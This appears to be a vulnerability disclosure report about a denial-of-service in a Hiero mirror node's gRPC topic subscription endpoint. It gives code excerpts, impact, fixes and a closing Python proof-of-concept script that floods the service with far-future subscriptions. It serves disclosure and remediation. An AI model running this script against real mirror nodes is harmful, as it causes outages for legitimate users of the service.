### Title
Unbounded `endTime` with No Global Subscription Limit Enables Resource-Exhaustion DoS via `PollingTopicListener`

### Summary
An unprivileged external user can open an unlimited number of gRPC `subscribeTopic` connections, each carrying up to 5 subscriptions with `consensusEndTime` set to a far-future timestamp (e.g., year 2100). Because `TopicMessageFilter` enforces no upper bound on `endTime`, and because there is no global cap on total concurrent subscriptions, each subscription creates a long-lived `PollingContext` that polls the database every 500 ms indefinitely. Accumulating thousands of such subscriptions exhausts the database connection pool, the `boundedElastic` scheduler thread pool, and heap memory, causing a denial-of-service.

### Finding Description

**Code path and root cause:**

`ConsensusController.subscribeTopic()` converts the protobuf `consensusEndTime` to a `long` nanosecond value with no upper-bound check:

```
// grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java:67-70
if (query.hasConsensusEndTime()) {
    long endTime = convertTimestamp(query.getConsensusEndTime());
    filter.endTime(endTime);
}
```

`TopicMessageFilter.isValidEndTime()` only verifies `endTime > startTime`; there is no constraint preventing `endTime` from being set to year 2100 or `Long.MAX_VALUE`:

```
// grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java:43-46
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
```

`PollingTopicListener.listen()` creates one `PollingContext` per call and schedules it to repeat `Long.MAX_VALUE` times at the configured `interval` (default 500 ms). The loop has no awareness of `endTime`; it runs until the subscriber cancels or the JVM dies:

```
// grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java:34-48
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);
    Duration interval = listenerProperties.getInterval();
    return Flux.defer(() -> poll(context))
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                    .jitter(0.1)
                    .withFixedDelay(interval)
                    .withScheduler(scheduler))
            ...
```

`TopicMessageServiceImpl.pastEndTime()` is the only mechanism that could terminate a subscription when `endTime` is reached, but it polls every `endTimeInterval` (default 30 s) and only signals completion once wall-clock time exceeds `endTime`. With `endTime` = year 2100, this signal never fires for ~74 years:

```
// grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java:123-130
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```

**Why existing checks fail:**

`NettyProperties.maxConcurrentCallsPerConnection` defaults to 5, limiting calls *per TCP connection*, not total connections across the server. An attacker opens N independent TCP connections, each carrying 5 subscriptions, yielding N×5 live subscriptions with no server-side cap:

```
// grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java:14
private int maxConcurrentCallsPerConnection = 5;
```

`subscriberCount` in `TopicMessageServiceImpl` is a Micrometer gauge for observability only — it is never checked against a maximum and never rejects new subscriptions:

```
// grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java:48,52-55
private final AtomicLong subscriberCount = new AtomicLong(0L);
...
Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
        .description("The number of active subscribers")
        ...
```

There is no per-IP rate limit, no authentication requirement, and no global subscription ceiling anywhere in the gRPC stack.

### Impact Explanation
Each live subscription fires a JPA query against the `topic_message` table every 500 ms. With 1,000 concurrent subscriptions (200 connections × 5 calls each), the server issues 2,000 DB queries per second continuously. This exhausts the HikariCP connection pool, starves legitimate queries, and causes heap growth from accumulated `PollingContext` / `TopicContext` / Reactor pipeline objects. The `boundedElastic` scheduler (default ceiling: 10 × CPU cores bounded threads, up to 100,000 queued tasks) is also saturated. The combined effect is a full service outage for all mirror-node gRPC consumers, which includes Hedera SDK clients relying on HCS topic subscriptions — a high-impact, non-network-based DoS against a critical infrastructure component.

### Likelihood Explanation
No authentication or API key is required to call `subscribeTopic`; the gRPC port is publicly reachable. The attack requires only a standard gRPC client (e.g., `grpcurl`, the Hedera Java SDK, or a custom script). Opening hundreds of connections with crafted `consensusEndTime = 4102444800` seconds (year 2100) is trivial and repeatable from a single machine or a small botnet. The attacker does not need to know any secret, hold any token, or have any on-chain account.

### Recommendation
1. **Enforce a maximum `endTime` horizon** in `TopicMessageFilter.isValidEndTime()`, e.g., reject any `endTime` more than a configurable window (e.g., 24 hours) beyond `now`.
2. **Enforce a global concurrent-subscription ceiling** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable `maxSubscribers` property and return `RESOURCE_EXHAUSTED` if exceeded.
3. **Add per-IP connection rate limiting** at the Netty layer (via `maxConnectionsPerIp` or an external proxy) to prevent a single client from opening unbounded connections.
4. **Propagate `endTime` into `PollingTopicListener`** so the polling loop self-terminates when `endTime` is in the past, rather than relying solely on the `pastEndTime` signal in the service layer.

### Proof of Concept
```python
import grpc
from concurrent import futures
# proto-generated stubs for ConsensusService
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hedera.hashgraph.sdk.proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1          # any existing topic
END_YEAR_2100_SECS = 4102444800  # 2100-01-01T00:00:00Z

channels = []
for _ in range(200):                          # 200 TCP connections
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    for _ in range(5):                        # 5 calls per connection = 1000 total
        query = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
            consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
            consensusEndTime=timestamp_pb2.Timestamp(seconds=END_YEAR_2100_SECS),
        )
        stub.subscribeTopic(query)            # non-blocking streaming call; stays open
    channels.append(ch)

# After ~30 seconds, DB connection pool is exhausted;
# legitimate subscribeTopic calls begin timing out or returning UNAVAILABLE.
input("Press Enter to release connections...")
for ch in channels:
    ch.close()
```
